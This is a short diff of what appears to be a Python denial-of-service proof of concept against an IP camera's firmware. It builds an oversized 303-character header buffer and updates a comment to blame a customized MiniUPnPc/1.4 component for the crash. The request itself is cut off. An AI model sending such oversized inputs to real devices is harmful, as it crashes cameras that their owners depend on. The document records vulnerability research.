@@ -2,7 +2,7 @@ import requests
 # buffer > 302 = crash
 # local dos poc
 # firmware 0.1.9.0
-# ipcam runs thttpd 2.25b 29dec2003 wasn't able to reproduce the crash on my test machine so I wasn't able to debug with gdb..
+# turns out to be a bug in a customized version of MiniUPnPc/1.4 see sctrl in the firmware progs bin folder.
 
 buffer = 303 * "X"
 headers = {
